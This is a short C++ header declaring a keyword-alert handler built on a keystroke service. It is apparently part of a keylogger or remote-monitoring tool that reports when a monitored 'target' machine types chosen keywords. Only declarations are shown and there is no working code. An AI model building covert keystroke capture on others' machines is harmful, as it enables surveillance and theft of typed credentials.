#pragma once

#include <string>

#include "domain/common/Result.hpp"
#include "application/interfaces/IReporter.hpp"
#include "domain/services/IKeystrokeService.hpp"

namespace nuub::application::commands {

class KeywordAlertHandler {
    domain::services::IKeystrokeService& keystrokes_;
    interfaces::IReporter& reporter_;
    std::string pc_id_;

    [[nodiscard]] bool matches(const std::string& target) const;

public:
    KeywordAlertHandler(
        domain::services::IKeystrokeService& keystrokes,
        interfaces::IReporter& reporter,
        std::string pc_id);

    domain::Result<void> handle_add_alert(const std::string& target, const std::string& keyword);
    domain::Result<void> handle_remove_alert(const std::string& target, const std::string& keyword);
    domain::Result<void> handle_list_alerts(const std::string& target);
};

} // namespace nuub::application::commands
